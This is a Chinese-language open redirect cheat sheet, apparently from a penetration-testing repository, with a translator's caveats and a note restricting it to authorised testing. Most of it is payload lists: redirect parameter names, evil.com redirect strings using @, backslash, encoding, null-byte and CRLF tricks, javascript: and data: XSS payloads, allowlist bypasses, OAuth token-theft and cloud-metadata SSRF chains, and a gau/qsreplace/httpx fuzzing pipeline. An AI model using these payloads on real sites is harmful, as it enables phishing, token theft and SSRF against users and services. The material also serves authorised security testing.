# 🔀 开放重定向速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

> **载荷适用性说明：** 下列 URL、编码、反斜杠和空字节写法均为原文测试样例，并非通用绕过。结果取决于应用校验、解码层次、浏览器和 URL 解析器，不能只用字符串是否包含可信域名来判断最终目标。`evil.target.com` 是否由攻击者控制也需要独立确认。参见 [OWASP 重定向说明](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) 与 [WHATWG URL 标准](https://url.spec.whatwg.org/)。
>
> **组合利用说明：** OAuth 示例只有在重定向校验及相关流程存在额外缺陷时才可能泄露授权码或令牌；安全实现应严格匹配注册的重定向 URI，参见 [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700.html)。把浏览器重定向到内网地址本身不等于 SSRF，还需要服务端实际发起并跟随相关请求。`javascript:` / `data:` 示例也只有在特定可执行上下文中才可能形成 XSS；其中的 `alert` 并非普通外站重定向。应核实实际响应与最终导航目标，所有原始载荷及命令均保留不变。

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## 🎯 什么是开放重定向

**开放重定向（Open Redirect）** 允许攻击者借助可信域名，将用户引向恶意站点；它可能被用于钓鱼，或与其他漏洞组合利用。

---

## 🔍 常见参数

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 载荷

### 基础
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### 省略协议的写法
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### 使用 @ 符号
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### 反斜杠技巧
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### URL 编码
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### 域名混淆
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### 空字节（NULL Byte）
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### CRLF（回车换行）注入
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### JavaScript 重定向
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ 绕过技术

### 存在允许列表检查时
```
# 子域名绕过
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# 路径绕过
https://target.com/https://evil.com
https://target.com//evil.com
```

### 仅允许 HTTPS 时
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### 本地主机地址变体
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 开放重定向与其他漏洞组合

### OAuth 令牌窃取
```
https://target.com/oauth?redirect_uri=https://evil.com
→ 窃取 OAuth 令牌（需满足额外条件，见译注）
```

### SSRF 组合利用
```
https://target.com/redirect?url=http://169.254.169.254/
```

### XSS 组合利用
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 速查

| 载荷类型 | 示例 |
|--------------|---------|
| 基础 | `//evil.com` |
| @ 符号 | `https://target.com@evil.com` |
| 编码 | `https:%2f%2fevil.com` |
| 域名混淆 | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ 工具

```bash
# GF 匹配模式
gau target.com | gf redirect

# 手动测试
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 参考资源

- [PortSwigger 开放重定向说明](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 利用重定向漏洞！</b><br>
  <i>仅用于获得授权的测试！</i>
</p>
